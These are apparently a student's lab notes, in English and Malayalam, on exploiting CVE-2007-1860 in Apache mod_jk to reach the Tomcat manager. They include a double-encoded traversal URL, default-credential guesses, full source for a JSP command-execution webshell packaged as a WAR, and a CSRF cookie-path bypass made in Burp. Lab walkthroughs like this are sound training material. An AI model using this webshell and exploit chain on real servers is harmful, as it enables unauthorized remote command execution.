## Introduction
-->This exercise covers the exploitation of CVE-2007-1860. This vulnerability allows an attacker to gain access to inaccessible pages using crafted requests. This is a common trick that a lot of testers miss.
-->This course details the exploitation of a vulnerability in mod_jk.
-->By using this vulnerability it is possible to access the administration interface of a Tomcat server (Tomcat's manager)
-->By using this access, we will see how an attacker can use default credentials to log in as an administrator and use this access to gain code execution on the server.

## Architecture
-->On Unix/Linux systems, Tomcat cannot be run on port 80 unless you start as `root`, which is not a good idea since Tomcat does not drop privileges and will be running as root (as opposed to Apache which drops privileges during startup).
-->However, to be available from most users, the server needs to be available on port 80 (or 443 for https), that is one of the reasons that developers use Apache to "proxy" the requests made to port 80, to Tomcat running on a higher port.
-->The Apache and Tomcat servers can be on the same server or on different servers, this can be confusing once you gain command execution on the Tomcat server and realise that its configuration does not match what you see on the Apache end.
-->There are two common ways to "proxy" requests from Apache to Tomcat :
-   http_proxy: the requests are forwarded to Tomcat using the HTTP protocol.
-   ajp13: the requests are forwarded to Tomcat using the AJP13 protocol. This configuration is used in this exercise using the Apache module `mod_jk`.
-->oru 404 error undakiyal namuk manasilakum apache aano tomcat aano run chyunathen ok

# CVE-2007-1860
## Introduction
-->Our goal here is to gain access to the Tomcat Manager.
-->The Tomcat Manager is used to deploy web applications within Tomcat. Tomcat Manager is available at the following URI: `/manager/html` and is, most of the time, protected by a password (and should not be installed on production servers).

## Accessing the Manager using CVE-2007-1860


# Video explanation
-->Here we are going to exploit mod_jk to gain code execution
-->The tomcat manager is used to manage application on tomcat.it allow deployment of web application.athyath web server apache aayirikum but application ullath tomcat server il aayirikum.so namal oru website il 404 error il apache enn kandalum application chelapo tomcat serveril aayirikum run chyuka ok.apache chelapo proxy/loadbalancing oke aayirikum
-->by default tomcat manager used to be deployed with a few default passwords ie, tomcat:tomcat , admin:admin , admin:  [no passwd]
-->tomcat use .war file to manage application deployment. the war file is just a zip file.ath ariya ->file webshell.war   ennadich nokiyal mathi ok
-->mod_jk is a connector between apache and tomcat.basically it allows to talk AJP13 between apache and tomcat. AJP13 is little bit faster than HTTP because it is a binary protocol instead of a being a text protocol like HTTP. 

         CLIENT ----->APACHE WEBSERVER WITH MOD_JK ------->TOMCAT AJP13 CONNECTOR
 
 -->so ivide client HTTP vazhi apache ilek request ayakunu. but apache with the help of mod_JK aa request AJP13 vazhi aan tomcat server ilek request ayakunath.
 -->the problem with mod_Jk is that in 2007 il athil oru directory traversal vulnerability
 kandethi with a double encoded value - `%252e%252e`  basically encoding a dot twice

-->so namuk thodangam ithan url -> http://ptl-7e383789-61e33605.libcurl.so/
-->lab open aakumbol apache tomcat examples enn paranj rand link tharunund.vere onum ila
-->namude main url il enthengilum type chyth 404 error varuthumbol ie,http://ptl-7e383789-61e33605.libcurl.so/sldfj  page il kanan patum `Apache/2.4.10 (Debian)`
-->athayath main website il apache server aan run chyunath ennal naaml aa rand link il ethengilum eduthit oru 404 error varuthumbol kanan tomcat server aan run chyunath ie,http://ptl-7e383789-61e33605.libcurl.so/examples/servlets/sdf
-->so athinartham applications run chyunath tomcat il aan. but apache server proxy pole nilkunu ennan enik thonunath
-->athayath naamal ayakuna http request apache lek pokunu.apache il mod_jk enna sathanam und ath tomcat ilek aa request ayakunu.ennal aa request mod_jk decode chyth AJP13 protocol il aan request send chyunath enit ath tomcat il ethumbol ath pinem decode engand chyunu
-->so namuk tomcat inte manager interface ilek pokanam. ath ullath `/manager/html` enna path il aan
-->so namal http://ptl-7e383789-61e33605.libcurl.so/manager/html  enn koduth send chyumbol namuk apache-404-error aan varunath
-->ini namal tomcat application il keri aan /manager/html ennadikunathengil tomcat-404-error varum ie,http://ptl-7e383789-61e33605.libcurl.so/examples/servlets/manager/html
-->ivide tomcat-404-error il kanikunathenthenal `HTTP Status 404 - /examples/servlets/manager/html`  ennan. namuk pokendath /manager/html pathilekan.ivide /examples/servlets/manager/html aayathkondan namuk 404 error varunath ok
-->so namal ivide satharana chyuna poel directory traversal chyth nokuka ie,
->http://ptl-7e383789-61e33605.libcurl.so/examples/../manager/html
-->apol namuk apache 404 error varunu
-->namuk ariyam mod_jk request decode chyunund.enit ath tomcat il ethumbol avidem decode chyunund.so namal ee .. ennath double encode chyanam.apol traversal work aakum
->http://ptl-7e383789-61e33605.libcurl.so/examples/%252e%252e/manager/html
-->ingane kodukumbol namuk oru authentication form popup akum avide satharana ulla default aayitula credentials kodukanam. like admin:admin admin:tomcat admin: tomcat:admin
-->ivide admin:  with no passwd kodukumbol namuk tomcat inte application manager ilek keran patunund
-->njn nerthe paranju tomcat il namuk applications deploy chyan patum.ivide namuk tomcat inte manager il keran patiyath kond namuk direct aayi application deploy chyan patum ok
-->so namuk oru webshell upload chyan patumon nokam


## Building a Webshell
-->To build a Webshell, we will need to write the Webshell and package it as a `war` file.
-->To write the Webshell, we can either use JSP or Servlet. To keep things simple, we are going to build a JSP Webshell, the following code can be used :
```jsp
	<FORM METHOD=GET ACTION='index.jsp'>
	<INPUT name='cmd' type=text>
	<INPUT type=submit value='Run'>
	</FORM>
	<%@ page import="java.io.*" %>
	<%
	   String cmd = request.getParameter("cmd");
	   String output = "";
	   if(cmd != null) {
	      String s = null;
	      try {
	         Process p = Runtime.getRuntime().exec(cmd,null,null);
	         BufferedReader sI = new BufferedReader(new
	InputStreamReader(p.getInputStream()));
	         while((s = sI.readLine()) != null) { output += s+"</br>"; }
	      }  catch(IOException e) {   e.printStackTrace();   }
	   }
	%>
	<pre><%=output %></pre>
```
-->We can now create a directory name `webshell` and put our file (`index.jsp`) inside it :
```shell
$ mkdir webshell$ cp index.jsp webshell
```
-->Now we can build the war file using `jar` (provide with java) :
```
	$ cd webshell
	$ jar -cvf ../webshell.war *
	added manifest
	adding: index.jsp(in = 579) (out= 351)(deflated 39%)
```
-->Our Webshell (`webshell.war`) is now packaged, and we can upload it using the Tomcat Manager.
-->ini upload chyam.upload chyumbol 404 errro varum karanam namal upload chyumbol double encode chytha pathilekala pokunath.so inspect element adich matanam :
```html
	<form method="post" enctype="multipart/form-data" action="/examples/%252e%252e/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=4F429DF292EEA6B4A46C4A1C37F9BBEC">
<table cellspacing="0" cellpadding="3">
<tbody><tr>
 <td class="row-right">
```
-->ivide action= il namal path matunu.ini upload chyumbol namuk webshell upload chyan patunund ok
-->enit tomcat manager il nokiyal namal upload chytha file kanum.so athil click chyuka.apol athilek pokum.but prathyekich onum nadakila.karanam avideyum namal thane manually dot double encode chyanam ok ie,
->http://ptl-7e383789-61e33605.libcurl.so//examples/%252e%252e/webshell/
-->ini namuk command execute chyam ok

-->ivide namal chyuna challengil tomcat 7 aan use chyunath. ISO enna oru version und athil tomcat 6 aan work chyunath.athan moonamathe video 11 mint ullath.
-->tomcat7 il puthiya security implementations introduce chythitund to prevent CSRF
-->so athukond thane namal ipol video explanation il vaichapole chythal aavila.so athin namal csrf bypass enna kadamba koodi kadakanam.so ath chyam

## Exploitation on tomcat7
-->so sambavam nerthe pole oke thane.aadyam naaml manager path ilek pokuka
->ptl-7e383789-61e33605.libcurl.so/examples/%252e%252e/manager/html
-->ini ee request burp il poi ithinte response nokiyal kanam jsessionid=somecookiie...
kanan patum.ith csrf token aan :
```http
Set-Cookie: JSESSIONID=69F1EDE2BAFEAF1952258F99E7C2E6B7; Path=/manager/; HttpOnly
```
--> ivide nokiyal kanam cookie kk shesham path um koodi koduthitund.
-->ithkond enthan udheshikunathenal.ee app inte real admin ee /mangaer athayath http://url/manager/html  ilek pokumbol session cookie set chyapedum but namal direct url/manager pathilekala pokunath pakaram url/examples/%252e%252e/manager/html ilekan pokunath. logically nokiyal directory traverse nadathi namal url/manager/html ilekan pokunathengilum browser nokumbol namal /examples il ninuman namude path thudangunath.
-->so namude request il session cookie illathathkondan namuk tomcat il puthiya application deploy chyan patathath
-->so namal direst /manager enna path ilekan pokunathengile ee session cookie set aaku
-->so ith bypass chyan namal onukoodi tomcat manager page reload chyuka ie,
->ptl-7e383789-61e33605.libcurl.so/examples/%252e%252e/manager/html
-->enit ith burp il intercept chyuka.enit aa request inte response intercept chyuka
-->enit set-cookie: jess...... ; path=/manager/;  ennath mati path=/  enn kodukuka.apol ini namal ayakuna eth request ilum ee session cookie add ayikolum.apol server enth request um accept chyum
-->ini namal tomcat manager il `war file to deploy`  box inte avide poi inspect chyth 
```html
<action="/examples/%252e%252e/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=92163FA4016044CD6E1F94FA0EE63035">
```
nerthepole kodukuka.enit namude kayil ulla webshell.war file upload chyuka.apol tomcat il file upload aakum
-->ini aa file ilek pokuka.apol apache error kanikum.so avide url il :
->http://ptl-7e383789-61e33605.libcurl.so/examples/%252e%252e/webshell/
-->ingane kodukuka ini namuk commands execute chyam ok
-->NOTE : ivide /webshell in shesham nirbandamayum / idanam ie, /webshell/ ok
-->NOTE : njan github il ninum webshell.war filr download chythan ee lab complete chythath.karnam ente kalil il ->jar command aakunila. but ithil paranjapole code oke itt chythal exploitation work aayikolum ok




## Conclusion

-->This exercise explained how to get access to the Tomcat manager using CVE-2007-1860.
-->Once you have access to the manager, you will need to guess the credentials.
-->Fortunately, the system administrator doesn't know that the manager can be accessed by external users and didn't bother changing the default credentials.
-->Once you have credentials, you can easily access the administration interface of the application server and deploy a custom web application to run arbitrary commands on the system.

